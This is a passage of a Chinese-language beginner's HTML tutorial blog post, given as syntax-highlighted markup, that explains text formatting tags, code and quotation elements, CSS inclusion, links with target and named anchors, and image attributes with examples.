punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">text-align</span><span class="token punctuation">:</span>right</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>靠右对齐<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p style="text-align:left">靠左对齐</p><p style="text-align:center">居中对齐</p><p style="text-align:right">靠右对齐</p><br><h2 id="文本格式化"><a href="#文本格式化" class="headerlink" title="文本格式化"></a>文本格式化</h2><p><strong>定义很多供格式化输出的元素，比如粗体和斜体字。</strong></p><h3 id="格式化"><a href="#格式化" class="headerlink" title="格式化"></a>格式化</h3><p>建议用<code>strong</code>、<code>em</code>这类<strong>基于内容的样式</strong>（content-based style）来代替<code>b</code>、<code>i</code>这类<strong>物理样式</strong>（physical style），更能语义化。</p><p>详见这里：<a href="https://www.w3school.com.cn/html/html_style.asp" target="_blank" rel="noopener">HTML 教程延伸阅读：改变文本的外观和含义</a></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>b</span><span class="token punctuation">></span></span>This text is bold<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>b</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>strong</span><span class="token punctuation">></span></span>This text is strong<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>strong</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>big</span><span class="token punctuation">></span></span>This text is big<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>big</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>em</span><span class="token punctuation">></span></span>This text is emphasized<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>em</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span><span class="token punctuation">></span></span>This text is italic<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>i</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>small</span><span class="token punctuation">></span></span>This text is small<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>small</span><span class="token punctuation">></span></span>This text contains<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sub</span><span class="token punctuation">></span></span>subscript下标<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sub</span><span class="token punctuation">></span></span>This text contains<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>sup</span><span class="token punctuation">></span></span>superscript上标<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>sup</span><span class="token punctuation">></span></span></code></pre><p><b>This text is bold</b></p><p><strong>This text is strong</strong></p><p><big>This text is big</big></p><p><em>This text is emphasized</em></p><p><i>This text is italic</i></p><p><small>This text is small</small></p><p>This text contains<sub>subscript下标</sub></p><p>This text contains<sup>superscript上标</sup></p><hr><h3 id="预格式文本"><a href="#预格式文本" class="headerlink" title="预格式文本"></a>预格式文本</h3><p><code>&lt;pre&gt;</code>标签</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>这是预格式文本。它保留了      空格和换行。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>for i in range(1,10):     print(i)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span></code></pre><pre>这是预格式文本。它保留了      空格和换行。</pre><p><code>pre</code> 标签很适合显示计算机代码：（可以先用<code>pre</code>再用<code>code</code>标签</p><pre>for i in range(1,10):     print(i)</pre><hr><h3 id="计算机-编程代码"><a href="#计算机-编程代码" class="headerlink" title="计算机/编程代码"></a>计算机/编程代码</h3><p>这些标签常用于显示计算机/编程代码↓。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>Computer code<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>kbd</span><span class="token punctuation">></span></span>Keyboard input<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>kbd</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>tt</span><span class="token punctuation">></span></span>Teletype text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>tt</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>samp</span><span class="token punctuation">></span></span>Sample text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>samp</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>var</span><span class="token punctuation">></span></span>Computer variable<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>var</span><span class="token punctuation">></span></span></code></pre><p><code>Computer code</code></p><p><kbd>Keyboard input</kbd></p><p><tt>Teletype text</tt></p><p><samp>Sample text</samp></p><p><var>Computer variable</var></p><hr><h3 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h3><p>address</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>address</span><span class="token punctuation">></span></span>Written by <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span>.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span> Visit me at:<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>miaotony.xyz<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span> <span class="token punctuation">/></span></span>MeowBox<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>address</span><span class="token punctuation">></span></span></code></pre><address>Written by <a href="https://miaotony.xyz">MiaoTony</a>.<br> Visit me at:<br>miaotony.xyz<br>MeowBox</address><hr><h3 id="缩写和首字母缩写"><a href="#缩写和首字母缩写" class="headerlink" title="缩写和首字母缩写"></a>缩写和首字母缩写</h3><p>在某些浏览器中，当把鼠标移至缩略词语上时，title 可用于展示表达的完整版本。</p><p><code>&lt;abbr&gt;</code>定义缩写，<code>&lt;acronym&gt;</code> 定义首字母缩写。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>etcetera<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>etc.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>abbr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>acronym</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>World Wide Web<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WWW<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>acronym</span><span class="token punctuation">></span></span></code></pre><p><abbr title="etcetera">etc.</abbr><br><acronym title="World Wide Web">WWW</acronym></p><hr><h3 id="文字方向（双向重写）"><a href="#文字方向（双向重写）" class="headerlink" title="文字方向（双向重写）"></a>文字方向（双向重写）</h3><p>若浏览器支持双流向覆盖 bi-directional override (bdo)，<code>&lt;bdo&gt;</code>元素用于覆盖当前文本方向，则下面这一行会从右向左输出 (rtl)。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bdo</span> <span class="token attr-name">dir</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>rtl<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>Here is some Hebrew text<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>bdo</span><span class="token punctuation">></span></span></code></pre><bdo dir="rtl">Here is some Hebrew text</bdo><hr><h3 id="引用"><a href="#引用" class="headerlink" title="引用"></a>引用</h3><p>使用 blockquote 元素的话，浏览器会插入换行和外边距，而 q 元素不会有任何特殊的呈现（只是加一个引号）。</p><pre class=" language-html"><code class="language-html">这是长的引用：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>blockquote</span><span class="token punctuation">></span></span>这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>blockquote</span><span class="token punctuation">></span></span>这是短的引用：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>q</span><span class="token punctuation">></span></span>这是短的引用。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>q</span><span class="token punctuation">></span></span></code></pre><p>这是长的引用：</p><blockquote>这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。这是长的引用。</blockquote><p>这是短的引用：<br><q><br>这是短的引用。<br></q></p><hr><h3 id="删除线-amp-插入线"><a href="#删除线-amp-插入线" class="headerlink" title="删除线 &amp; 插入线"></a>删除线 &amp; 插入线</h3><p>大多数浏览器会改写为删除文本和下划线文本。</p><p>一些老式的浏览器会把删除文本和下划线文本显示为普通文本。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>一打有 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>del</span><span class="token punctuation">></span></span>二十<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>del</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>ins</span><span class="token punctuation">></span></span>十二<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>ins</span><span class="token punctuation">></span></span> 件。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>一打有 <del>二十</del> <ins>十二</ins> 件。</p><hr><h3 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h3><p> HTML5 标准：</p><ol><li>如果设置了 <code>&lt;dfn&gt;</code> 元素的 <code>title</code> 属性，则定义项目：</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>World Health Organization<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">></span></span> was founded in 1948.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>The <dfn title="World Health Organization">WHO</dfn> was founded in 1948.</p><ol start="2"><li>如果 <code>&lt;dfn&gt;</code> 元素包含具有标题的 <code>&lt;abbr&gt;</code> 元素，则 <code>title</code> 定义项目：</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>The<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>abbr</span> <span class="token attr-name">title</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>World Health Organization<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>abbr</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">></span></span>was founded in 1948.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>The <dfn><abbr title="World Health Organization">WHO</abbr></dfn> was founded in 1948.</p><ol start="3"><li>否则，<code>&lt;dfn&gt;</code> 文本内容即是项目，并且父元素包含定义。</li></ol><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>dfn</span><span class="token punctuation">></span></span>WHO<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>dfn</span><span class="token punctuation">></span></span> World Health Organization 成立于 1948 年。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><dfn>WHO</dfn> World Health Organization 成立于 1948 年。</p><p>若希望简而化之，请使用<strong>第一条</strong>，或使用 <code>&lt;abbr&gt;</code> 代替。</p><hr><h3 id="著作标题"><a href="#著作标题" class="headerlink" title="著作标题"></a>著作标题</h3><p>浏览器通常以斜体来显示。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>cite</span><span class="token punctuation">></span></span>The Scream<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>cite</span><span class="token punctuation">></span></span> by Edward Munch. Painted in 1893.<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><cite>The Scream</cite> by Edward Munch. Painted in 1893.</p><br><h2 id="计算机代码"><a href="#计算机代码" class="headerlink" title="计算机代码"></a>计算机代码</h2><p><code>&lt;code&gt;</code> 元素不保留多余的空格和折行。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></code></pre><code>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}</code><p>需解决该问题，必须在 <code>&lt;pre&gt;</code> 元素中包围代码</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>code</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>pre</span><span class="token punctuation">></span></span>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>pre</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>code</span><span class="token punctuation">></span></span></code></pre><code><pre>var person = {    firstName:"Bill",    lastName:"Gates",    age:50,    eyeColor:"blue"}</pre></code><p>也可以<code>code</code>和<code>pre</code>反过来。</p><br><h2 id="CSS-样式的引用"><a href="#CSS-样式的引用" class="headerlink" title="CSS 样式的引用"></a>CSS 样式的引用</h2><h3 id="外部样式表"><a href="#外部样式表" class="headerlink" title="外部样式表"></a>外部样式表</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>link</span> <span class="token attr-name">rel</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>stylesheet<span class="token punctuation">"</span></span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mystyle.css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="内部样式表"><a href="#内部样式表" class="headerlink" title="内部样式表"></a>内部样式表</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>style</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/css<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token style language-css"><span class="token selector">body </span><span class="token punctuation">{</span><span class="token property">background-color</span><span class="token punctuation">:</span> red<span class="token punctuation">}</span><span class="token selector">p </span><span class="token punctuation">{</span><span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px<span class="token punctuation">}</span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>style</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></code></pre><h3 id="内联样式"><a href="#内联样式" class="headerlink" title="内联样式"></a>内联样式</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token style-attr language-css"><span class="token attr-name"> <span class="token attr-name">style</span></span><span class="token punctuation">="</span><span class="token attr-value"><span class="token property">color</span><span class="token punctuation">:</span> red<span class="token punctuation">;</span> <span class="token property">margin-left</span><span class="token punctuation">:</span> <span class="token number">20</span>px</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span>This is a paragraph<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><strong>优先级</strong>是 <strong>内联样式&gt;内部样式表&gt;外部样式表</strong>。</p><br><h2 id="链接"><a href="#链接" class="headerlink" title="链接"></a>链接</h2><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://miaotony.xyz">MiaoTony’s blog</a></p><p>“链接文本” <strong>不必一定是文本</strong>。图片或其他 HTML 元素都可以成为链接。</p><p>这是另一个 mailto 链接：</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>mailto:someone@microsoft.com?cc<span class="token punctuation">=</span>someoneelse@microsoft.com&amp;bcc<span class="token punctuation">=</span>andsomeoneelse2@microsoft.com&amp;subject<span class="token punctuation">=</span>Summer%20Party&amp;body<span class="token punctuation">=</span>You%20are%20invited%20to%20a%20big%20summer%20party!<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>发送邮件！<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><a href="mailto:someone@microsoft.com?cc=someoneelse@microsoft.com&amp;bcc=andsomeoneelse2@microsoft.com&amp;subject=Summer%20Party&amp;body=You%20are%20invited%20to%20a%20big%20summer%20party!" target="_blank" rel="noopener">发送邮件！</a></p><h3 id="target-属性"><a href="#target-属性" class="headerlink" title="target 属性"></a>target 属性</h3><p>Target 属性可以定义被链接的文档在何处显示。</p><p><strong>在新窗口打开：</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_blank<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://miaotony.xyz" target="_blank">MiaoTony’s blog</a></p><p><strong>跳出页面框架：</strong></p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>https://miaotony.xyz<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_top<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>MiaoTony's blog<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="https://miaotony.xyz" target="_top">MiaoTony’s blog</a></p><p><strong>（在hexo部署的时候，好像把所有的<code>target</code>都改成 “_blank” 了 emmm</strong></p><h3 id="name-属性"><a href="#name-属性" class="headerlink" title="name 属性"></a>name 属性</h3><p>name属性规定锚（anchor）的名称。可以使用 name 属性创建 HTML 页面中的书签。</p><p>当使用命名锚（named anchors）时，我们可以创建直接跳至该命名锚（比如页面中某个小节）的链接。</p><p>首先<strong>对锚进行命名</strong>，或者说<strong>创建一个书签</strong>——</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>label123<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>锚（显示在页面上的文本）<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a name="label123">锚（显示在页面上的文本）</a></p><p>也可以使用 id 属性来替代 name 属性。</p><p>然后在同一个文档中<strong>创建指向该锚的链接</strong>，或在其他页面指向该锚，即可跳转到这个锚点的位置。</p><p>将 <code>#</code> 符号和锚名称添加到 URL 的末端，就可以直接链接到 tips 这个命名锚了。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>a</span> <span class="token attr-name">href</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>#tips<span class="token punctuation">"</span></span> <span class="token attr-name">target</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>_self<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>跳转到上面的锚点<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>a</span><span class="token punctuation">></span></span></code></pre><p><a href="#label123" target="_self">跳转到上面的锚点</a></p><p>假如浏览器找不到已定义的命名锚，那么就会定位到文档的顶端。不会有错误发生。</p><br><h2 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h2><p>空标签，只包含属性，并且没有闭合标签。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>url<span class="token punctuation">"</span></span>  <span class="token punctuation">/></span></span></code></pre><h3 id="替代文本-alt-属性"><a href="#替代文本-alt-属性" class="headerlink" title="替代文本 alt 属性"></a>替代文本 alt 属性</h3><p>在浏览器无法载入图像时（图裂了），替换文本属性将被用来显示失去的信息。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>cat.gif<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>A cat<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>就像这样：</p><img src="/2020/02/14/FrontEnd_HTML_Basic/cat.gif" alt="A cat"><h3 id="图像背景"><a href="#图像背景" class="headerlink" title="图像背景"></a>图像背景</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span> <span class="token attr-name">background</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/background.jpg<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></code></pre><p>如果图像小于页面，图像会进行重复。</p><h3 id="图像对齐"><a href="#图像对齐" class="headerlink" title="图像对齐"></a>图像对齐</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>未设置对齐方式的图像：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 &lt;img src ="pic.jpg"> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h2</span><span class="token punctuation">></span></span>已设置对齐方式的图像：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h2</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>pic.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>bottom<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 &lt;img src ="pic.jpg" align="middle"> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>图像 &lt;img src ="pic.jpg" align="top"> 在文本中<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p>bottom 对齐方式是默认的对齐方式。</p><p><img src="/2020/02/14/FrontEnd_HTML_Basic/img_aglin.png" alt="img_aglin"></p><h3 id="浮动图像"><a href="#浮动图像" class="headerlink" title="浮动图像"></a>浮动图像</h3><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;img src ="/i/eg_cute.gif" align ="left"> 带有图像的一个段落。图像的 align 属性设置为 "left"。图像将浮动到文本的左侧。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>p</span><span class="token punctuation">></span></span>&lt;img src ="/i/eg_cute.gif" align ="right"> 带有图像的一个段落。图像的 align 属性设置为 "right"。图像将浮动到文本的右侧。<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>p</span><span class="token punctuation">></span></span></code></pre><p><img src="/2020/02/14/FrontEnd_HTML_Basic/img_aglin2.png" alt="浮动图像"></p><h3 id="图像尺寸"><a href="#图像尺寸" class="headerlink" title="图像尺寸"></a>图像尺寸</h3><p>通过改变 img 标签的 “height” 和 “width” 属性的值，可以放大或缩小图像。</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>50<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>100<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>/html5.jpg<span class="token punctuation">"</span></span> <span class="token attr-name">width</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>200<span class="token punctuation">"</span></span> <span class="token attr-name">height</span><span class="token attr-value"><span class="token punctuation">=</span><span 